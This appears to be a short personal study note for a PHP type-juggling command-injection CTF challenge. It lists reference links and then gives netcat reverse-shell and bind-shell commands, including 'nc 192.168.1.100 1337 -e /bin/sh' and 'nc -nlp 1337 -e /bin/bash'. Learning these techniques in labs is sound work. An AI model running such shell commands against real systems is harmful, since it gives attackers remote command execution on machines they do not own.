## intigirit php type juggling command injection
```
https://challenge-0423.intigriti.io/challenge.php
https://www.youtube.com/watch?v=9TCLI04vlvg
https://cybernetgen.com/auth-bypass-with-php-type-juggling
https://medium.com/@codingkarma/not-so-obvious-php-vulnerabilities-388a3b7bf2dc
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
```
## reverse shell
```
nc -nlvp 1337 no_lookup listen verbose port
nc 192.168.1.100 1337 -e /bin/sh
curl curlip.me
ip addr show
ifconfig

```
## netcat 
```
terminal 1 (/home)((commands in terminal 2 will be executed in terminal 1
$nc -nlp 1337 -e /bin/bash
^c

terminal 2(/downloads)
$nc 127.0.0.1 1337 
ls
->file in terminal1

```
## netcat
```
terminal 1 (/home)
$nc -nlp 1337
ls
->file in terminal


terminal 2(/downloads)((commands in terminal 1 will be executed in terminal 2
$nc 127.0.0.1 1337 -e /bin/bash
^c
```
